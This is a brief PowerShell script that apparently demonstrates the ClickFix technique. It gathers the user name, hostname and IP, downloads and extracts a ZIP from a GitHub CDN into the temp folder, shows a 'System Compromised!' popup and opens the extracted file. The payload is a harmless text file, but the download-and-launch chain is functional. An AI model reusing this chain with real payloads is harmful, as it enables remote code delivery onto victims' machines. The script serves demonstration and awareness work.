Add-Type -AssemblyName System.Windows.Forms

# Gather system info
$user = whoami
$host_name = hostname
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'} | Select-Object -First 1).IPAddress

# Download and extract ZIP
$url = "https://cdn.jsdelivr.net/gh/olympusmons5143/test@main/demo.zip"
$dest = "$env:TEMP\demo.zip"
$extract = "$env:TEMP\demo"

Invoke-WebRequest -Uri $url -OutFile $dest
Expand-Archive -Path $dest -DestinationPath $extract -Force

# Show popup with system info
$info = "System Compromised!`n`nUser: $user`nHost: $host_name`nIP: $ip`n`nPayload extracted to: $extract"
[System.Windows.Forms.MessageBox]::Show($info, "ClickFix Demo", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)

# Open extracted file
Start-Process "$extract\demo.txt"
